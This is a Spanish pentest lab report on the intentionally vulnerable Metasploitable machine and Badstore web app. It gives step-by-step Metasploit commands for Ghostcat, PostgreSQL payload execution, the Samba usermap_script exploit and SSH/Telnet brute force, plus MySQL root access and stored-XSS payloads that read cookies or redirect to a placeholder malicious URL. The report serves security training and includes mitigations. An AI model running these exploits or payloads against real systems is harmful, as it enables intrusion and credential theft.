# Reporte Pentesting
### Introducción
La evaluación de seguridad, también conocida como pentesting, es un proceso fundamental para identificar y remediar vulnerabilidades en sistemas informáticos y aplicaciones web. En este informe, se presenta un análisis detallado de las vulnerabilidades, sus posibles impactos, explotación y las estrategias de mitigación aplicadas en dos entornos: la máquina **Metasploitable** y la aplicación web **Badstore**.

### Objetivos del Pentesting
Evaluar la seguridad de Metasploitable: El objetivo es identificar las vulnerabilidades en el sistema Metasploitable para comprender el nivel de exposición y posibles riesgos asociados.

Evaluar la seguridad de Badstore: El propósito es analizar las vulnerabilidades de la aplicación web Badstore, investigar su posible impacto en la seguridad y recomendar soluciones para mitigar los riesgos.

### Metodología de Pentesting
La evaluación de seguridad se basa en una metodología ampliamente aceptada para asegurar un enfoque sistemático. Para este proyecto, se utilizó una metodología que incluyó las siguientes etapas:

- **Reconocimiento (Reconnaissance)**: Durante esta fase, se recopilaron datos básicos sobre los objetivos, como direcciones IP, servicios en ejecución y posibles vectores de ataque.

- **Escaneo (Scanning)**: Se realizaron exploraciones de puertos y servicios en los sistemas Metasploitable y la aplicación Badstore para identificar posibles vulnerabilidades.

- **Enumeración (Enumeration)**: Se obtuvieron más detalles sobre los servicios y recursos identificados durante el escaneo, como usuarios, grupos y configuraciones.

- **Explotación (Exploitation)**: Se intentó aprovechar las vulnerabilidades descubiertas para determinar si son explotables y cuál es su impacto potencial.

- **Post-explotación (Post-Exploitation)**: Si se lograba la explotación exitosa, se analizaban las acciones posteriores, como el acceso a datos sensibles o el control del sistema.

- **Documentación y Reporte (Documentation and Reporting)**: Se preparó este informe que detalla las vulnerabilidades identificadas, el impacto potencial, las recomendaciones de mitigación y otros hallazgos importantes.

## Tecnologías y Entornos Evaluados
### Metasploitable
Metasploitable es una máquina virtual diseñada para entrenamiento en seguridad. Está basada en una distribución de Linux (Debian) y contiene una serie de vulnerabilidades deliberadamente incluidas para propósitos de aprendizaje y pruebas. Las tecnologías y servicios evaluados en Metasploitable incluyen:

- Servidores web (Apache, FTP, Telnet).
- Protocolos de red (SSH, SMB).
- Sistemas de bases de datos (MySQL).
- Aplicaciones web vulnerables.
### Badstore
Badstore es una aplicación web deliberadamente insegura utilizada para practicar y aprender acerca de vulnerabilidades comunes en aplicaciones web. Las tecnologías y componentes evaluados en Badstore incluyen:

- Aplicaciones web (páginas de inicio de sesión, formularios, etc.).
- Tecnologías web (HTML, JavaScript, PHP).
- Bases de datos (MySQL).
- Vulnerabilidades típicas (inyección SQL, Cross-Site Scripting, autenticación insegura, etc.).

### Evaluación de Vulnerabilidades
Durante el proceso de pentesting, se identificaron diversas vulnerabilidades en Metasploitable y Badstore, algunas de las cuales podrían tener un impacto significativo en la seguridad. Estas vulnerabilidades se dividen en categorías como inyección, autenticación insegura, falta de control de acceso, etc.

### Posible Impacto y Explores
En esta sección, se describirá el posible impacto de las vulnerabilidades identificadas, incluyendo el riesgo para la confidencialidad, integridad y disponibilidad de los sistemas y datos. Además, se detallarán los métodos de explotación utilizados durante el pentesting.

### Mitigación de Vulnerabilidades
Se proporcionarán recomendaciones específicas para mitigar las vulnerabilidades identificadas en Metasploitable y Badstore. Estas recomendaciones incluirán soluciones técnicas y mejores prácticas de seguridad.


## Maquina Metasploitable
### Introduccion 
A continuación se hablará acerca de las vulnerabilidades encontradas en la siguiente maquina *'Metasploitable'* donde se identificaran algunas de sus vulnerabilidades, explotación de dichas vulnerabilidades, posibles consecuencias de que un agente malicioso haga uso de estas y soluciones para mitigar estos riesgos.

### Vulnerabilidades
#### Apache Tomcat AJP Connector Request Injection (*Ghostcat*).
1) **Descripción**: La vulnerabilidad Ghostcat se debe a una configuración incorrecta por defecto en las versiones de Tomcat 6.x, 7.x, 8.x y 9.x. El problema principal se encuentra en la falta de autenticación adecuada en el conector AJP
2) **Impacto**: Revelación de archivos sensibles, Ejecución remota de código, Denegación de servicio.
3) **Explotación**:
- Abriremos una consola de comandos en nuestra maquina KaliLinux, donde buscaremos la herramienta 
```bash
msfconsole
```
- Una vez aberta la herramienta escribiremos lo siguiente 
```bash
search tomcat
```
y seleccionaremos 
**`auxiliary/admin/http/tomcat_ghostcat                          2020-02-20       normal     Yes    Apache Tomcat AJP File Read `**
usando 
```bash
use auxiliary/admin/http/tomcat_ghostcat
```
- Procedemos a configurar la herramienta escribiendo 
```bash
info
```
para ver los parametros que debemos introducir y elegir el payload adecuado para nuestro ataque.

- Establecemos los parametros:
```bash
set RHOST [ip de la maquina]
```
```bash
set RPORT [puerto donde se ecuentra Tomcat, muchas veces 8180]
```
- Procedemos a ejecutar la herramienta.
```bash
run
```
Lo cual nos retorna el archivo de configuración de Tomcat
<kbd>![Ghostcat Vulnerability](/img/ghostcat.png)</kbd>

4) **Mitigación**: Cambiar configuración por defecto añadiendo una autentcación adecuada y limitar acceso a IP's confiables.

#### Ataque de Bibliotecas Compartidas de Funciones Definidas por el Usuario (UDF)[Postgresql].
1) **Descripción**: En algunas instalaciones por defecto de PostgreSQL en Linux, la cuenta de servicio
cuenta de servicio postgres puede escribir en el directorio /tmp, y UDF Shared Libraries, permitiendo la ejecución de código arbitrario.

2) **Impacto**:Podría permitir a los atacantes con acceso al sistema aprovechar esta vulnerabilidad para cargar su propio código malicioso en PostgreSQL y ejecutarlo sin restricciones en el sistema. 

3) **Explotación**:
- Abriremos una consola de comandos en nuestra maquina KaliLinux, donde buscaremos la herramienta 
```bash
msfconsole
```
- Una vez aberta la herramienta escribiremos lo siguiente 
```bash
search postgresql
```
y seleccionaremos 
**`exploit/linux/postgres/postgres_payload    2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution`**
usando :
```bash
use linux/postgres/postgres_payload
```
- Procedemos a configurar la herramienta escribiendo 
```bash
info
```
para ver los parametros que debemos introducir y elegir el payload adecuado para nuestro ataque.

- Establecemos los parametros:
```bash
set RHOST [ip de la maquina]
```
```bash
set RPORT [puerto donde se ecuentra postgresql 5432]
```
- Procedemos a ejecutar la herramienta.
```bash
exploit
```
- A continuación se desplegara una terminal de *meterpreter*, desde donde podremos emepzar un ataque a la maquina que hace de servidor de la base de datos.

<kbd>![Postgrres Vulnerability](/img/postgresql.png)</kbd>

4) **Mitigación**:  Se debe mantener actualizado postgresql, así como restringir el acceso para que no se tenga acceso aldirectorio '/tmp'.|||

#### Samba Username map script 
1) **Descripción**: En Samba, la opción "username map script" se utiliza para asignar nombres de usuario antes de la autenticación en el sistema. Esta característica permite a los administradores de sistemas personalizar la forma en que se mapean los nombres de usuario. Por lo general, se utiliza para asignar nombres de usuario de sistemas Windows a nombres de usuario de sistemas Unix.

2) **Impacto**: La vulnerabilidad radica en la falta de validación adecuada de los nombres de usuario cuando se utiliza la opción "username map script". Los atacantes pueden aprovechar esto especificando un nombre de usuario que contenga caracteres especiales utilizados en la sintaxis de comandos de shell, como los caracteres de comillas, comas, ampersands y otros. Al hacerlo, pueden inyectar comandos maliciosos en la opción "username map script" y ejecutar comandos arbitrarios en el sistema comprometido.

3) **Explotación**:
- Abriremos una consola de comandos en nuestra maquina KaliLinux, donde buscaremos la herramienta 
```bash
msfconsole
```
- Una vez aberta la herramienta escribiremos lo siguiente 
```bash
search samba/usermap_script
```
y seleccionaremos 
**`exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution`**
usando 
```bash
use exploit/multi/samba/usermap_script
```
- Procedemos a configurar la herramienta escribiendo 
```bash
info
```
para ver los parametros que debemos introducir y elegir el payload adecuado para nuestro ataque.

- Establecemos los parametros:
```bash
set RHOST [ip de la maquina]
```
- Procedemos a ejecutar la herramienta.
```bash
run
```
Lo cual nos retorna una terminal desde donde un atacante podría llevar acabo varios tipos de ataque segun sea su intención.

<kbd>![Samba Vulnerability](/img/samba.png)</kbd>

4) **Mitigación**:Se recomienda actualizar a una versión más reciente de Samba que haya solucionado el problema o deshabilitar la opción "username map script" si no es esencial para su configuración.

#### SSH Brute Force Attack
1) **Descripción**:  Un ataque de fuerza bruta SSH es cuando un atacante intenta adivinar la contraseña de una cuenta SSH al probar repetidamente diferentes combinaciones de contraseñas hasta que encuentra la correcta.
2) **Impacto**:  Si un atacante tiene éxito en un ataque de fuerza bruta SSH, podría obtener acceso no autorizado a un sistema, lo que le permitiría realizar acciones maliciosas, robar información o dañar el sistema.
3) **Explotación**:
- Abriremos una consola de comandos en nuestra maquina KaliLinux, donde buscaremos la herramienta 
```bash
msfconsole
```
- Una vez aberta la herramienta escribiremos lo siguiente 
```bash
search SSH
```
y seleccionaremos 
**`auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner`**
usando 
```bash
use auxiliary/scanner/ssh/ssh_login 
```
- Procedemos a configurar la herramienta escribiendo 
```bash
info
```
para ver los parametros que debemos introducir y elegir el payload adecuado para nuestro ataque.

- Establecemos los parametros:
```bash
set RHOST [ip de la maquina]
```
Creamos un archivo donde pondremos las contrseñas comunes que se suelen usar en maquinas con protocolo SSH
```bash
cat > ssh_pass.txt
```
Creamos un archivo donde pondremos los usuarios comunes que se suelen usar en maquinas con protocolo SSH
```bash
cat > ssh_users.txt
```
Procedemos a agregarlas en nuestro payload.
```bash
set PASS_FILE ssh_pass.txt
```
```bash
set USER_FILE ssh_users.txt
```
- Procedemos a ejecutar la herramienta.
```bash
run
```
<kbd>![SSH Brute Force](/img/SSH.png)</kbd>
<kbd>![SSH Exploit](/img/capture_ssh.png)</kbd>

Como se encontro una coincidencia podemos proceder a hacer una conexión via SSH con las credenciales econtradas.

4) **Mitigación**: Para mitigar este tipo de ataque, se pueden implementar medidas como el uso de contraseñas fuertes, la configuración adecuada de SSH para limitar el número de intentos de inicio de sesión, y la autenticación de dos factores para añadir una capa adicional de seguridad.

#### Telnet Brute Force Attack
1) **Descripción**: Un ataque de fuerza bruta Telnet es cuando un atacante intenta adivinar la contraseña de una cuenta Telnet al probar repetidamente diferentes combinaciones de contraseñas hasta que encuentra la correcta.
2) **Impacto**: Si un atacante tiene éxito en un ataque de fuerza bruta Telnet, podría obtener acceso no autorizado a un sistema, lo que le permitiría realizar acciones maliciosas, robar información o dañar el sistema.
3) **Explotación**:
- Abriremos una consola de comandos en nuestra maquina KaliLinux, donde buscaremos la herramienta 
```bash
msfconsole
```
- Una vez aberta la herramienta escribiremos lo siguiente 
```bash
search telnet login
```
y seleccionaremos 
**`auxiliary/scanner/telnet/telnet_login                                              normal     No     Telnet Login Check Scanner`**
usando 
```bash
use auxiliary/scanner/telnet/telnet_login 
```
- Procedemos a configurar la herramienta escribiendo 
```bash
info
```
para ver los parametros que debemos introducir y elegir el payload adecuado para nuestro ataque.

- Establecemos los parametros:
```bash
set RHOST [ip de la maquina]
```
Creamos un archivo donde pondremos las contrseñas comunes que se suelen usar en maquinas con protocolo telnet.
```bash
cat > telnet_pass.txt
```
Creamos un archivo donde pondremos los usuarios comunes que se suelen usar en maquinas con protocolo telnet.
```bash
cat > telnet_users.txt
```
Procedemos a agregarlas en nuestro payload.
```bash
set PASS_FILE telnet_pass.txt
```
```bash
set USER_FILE telnet_users.txt
```
- Procedemos a ejecutar la herramienta.
```bash
run
```

<kbd>![Telnet Brute Force](/img/telnet.png)</kbd>
<kbd>![Telnet Exploit](/img/capture_telnet.png)</kbd>
Como se encontro una coincidencia podemos proceder a hacer una conexión via telnet con las credenciales econtradas.

4) **Mitigación**: Para mitigar este tipo de ataque, se recomienda no utilizar Telnet, ya que es un protocolo de comunicación inseguro. En su lugar, se debe utilizar SSH u otros protocolos más seguros. Además, se pueden implementar medidas adicionales como contraseñas fuertes y la configuración adecuada para limitar los intentos de inicio de sesión.

## Aplicación Web 'Badstore'
### Introduccion 
A continuación se hablará acerca de las vulnerabilidades encontradas en la siguiente maquina que aloja la apliacación *'Badstore'* donde se identificaran algunas de sus vulnerabilidades, explotación de dichas vulnerabilidades, posibles consecuencias de que un agente malicioso haga uso de estas y soluciones para mitigar estos riesgos.

#### SQL Injection
1) **Descripción**: Puede ocurrir cuando los input de un sistema web permiten a un atacante agregar caracteres especiales, como comillas simples (') o comillas dobles ("), que pueden desencadenar errores en el servidor o permitir la ejecución de comandos SQL maliciosos.
Así mismo esta vulnerabilidad se presenta cuando la aplicación web no valida ni limpia adecuadamente las entradas de los usuarios y, en lugar de eso, permite que los comandos SQL se ejecuten directamente en la base de datos. 

2) **Impacto**: 

    **a)** En un ataque de inyección SQL, un atacante puede aprovechar esta vulnerabilidad para manipular las consultas SQL del sistema y acceder, modificar o eliminar datos de la base de datos, lo que puede tener graves consecuencias en la seguridad y la integridad de los datos. 
    
    **b)** Como resultado, un atacante puede aprovechar esta debilidad para obtener acceso no autorizado a la base de datos y realizar diversas acciones maliciosas.

3) **Explotación**
- Accederemos a la pagina web '[IP]/cgi-bin/badstore.cgi?action=loginregister' 
- Procederemos a corroborar el input de 'Email Adress' agregando un `'` y presionamos 'Login'.

<kbd>![SQL Injection Detection](/img/badstore_sql.png)</kbd>

Veremos un error de servidor producido por agregar un caracter que rompe la sintaxis de SQL y por ende nos retorna un error de servidor.

Para empezar se hace un scanner para corroborar el tipo de base de datos que usa la aplicación usando *nmap*.
```bash
nmap -sV [IP Servidor/Máquina]
```
<kbd>![nmap scan](/img/nmap_badstore.png)</kbd>

Una vez el error es corroborado vamos a intentar ingresar a la base de datos por medio de la consola con usuario generico root.
```bash
mysql -u root -h [IP servidor/maquina]
```
En este caso fue posible ingresar lo cual de entrada es una vulnerabilidad enorme porque este superusuario no tiene contraseña y además tiene privilegios elevados.

Procedemos a pedir que nos muestre las bases de datos disponibles
```bash
show databases;
```
Seleccionamos la base de datos.
```bash
use badstoredb;
```
Y indicamos que nos muestre las tablas.
```bash
show tables;
```
<kbd>![mysql exploit](/img/mysql_ev.png)</kbd>

Por último podríamos proceder a hacer una consulta de la tabla 'userdb' como un atacante haría.

<kbd>![mysql exploit](/img/mysql_users.png)</kbd>

4) **Mitigaacón**:Se puede mitigar mediante la validación y el filtrado adecuado de los inputs de usuario y el uso de consultas parametrizadas o de ORM (Object-Relational Mapping) en lugar de la concatenación de strings para construir consultas SQL.Para mitigar esta vulnerabilidad, es fundamental implementar medidas de seguridad, como la validación y la sanitización de entradas de usuario, así como el uso de consultas parametrizadas o el uso de un ORM (Mapeo Objeto-Relacional) para prevenir la inyección de SQL.

### Persistent XSS
1) **Descripción**: La vulnerabilidad de Cross-Site Scripting (XSS) persistente, también conocida como XSS almacenado, es un tipo de vulnerabilidad de seguridad en aplicaciones web donde un atacante puede inyectar código malicioso (generalmente JavaScript) en un sitio web o una aplicación web. A diferencia del XSS reflejado, donde el código malicioso se refleja de inmediato en la página y solo afecta a los usuarios que hacen clic en un enlace comprometido, en el XSS persistente, el código malicioso se almacena en el servidor y se entrega a todos los usuarios que visitan la página web comprometida. Esto hace que sea una amenaza más peligrosa, ya que puede afectar a un gran número de usuarios.
2) **Impacto**: El impacto de una vulnerabilidad de XSS persistente puede ser significativo. Los atacantes pueden aprovechar esta vulnerabilidad para robar credenciales de usuario, secuestrar sesiones, redirigir a los usuarios a sitios web maliciosos, o realizar acciones en nombre del usuario sin su consentimiento. Además, el código malicioso puede acceder a cookies, datos personales y otra información sensible de los usuarios, lo que puede tener graves repercusiones en la privacidad y seguridad de los afectados. 
3) **Explotación**:
- Accederemos a la pagina web '[IP]/cgi-bin/badstore.cgi?action=guestbook' 

- Procederemos a probar el input *'Comments'* de "Guestbook" donde haremos una inserción de codigo, en este caso para corroborar la vulnerabilidad haremos lo siguiente:
```html
<plaintext>
```
<kbd>![XSS Test](/img/XSS_persistent.png)</kbd>

En este caso se utiliza el tag `<plaintext>` para evitar que los navegadores interpreten el contenido.
Lo que pasará a continuación es que se mostrará el contenido del código de la página de manera persistente, es decir aunque recarguemos y escribamos algo distinto contnuará apareciendo el contenido de esta manera.

Aunque es posible hacer ataques más sofisticados, como por ejemplo robar cookies de sesión.

```html
<script>
    let cookie = document.cookie;
    document.center.innerHTML="Cookie session is ->"+cookie;
</script>
```
O inyectar enlaces maliciosos.
```html
<script>
    document.querySelectorAll('input[type="submit"]').onClick = function (){
        window.location.href='http://maliciouslink.com';
    }
</script>
```

4) **Mitigación**: 

    **a)** *Validación y escape de entrada*: Todas las entradas del usuario, como formularios y URL, deben ser validadas y escapadas adecuadamente para evitar que el código malicioso se almacene en la base de datos o se muestre en las páginas.

    **b)** *Control de acceso*: Limita el acceso a la funcionalidad de almacenamiento y recuperación de datos para evitar que usuarios no autorizados puedan modificar datos en la base de datos.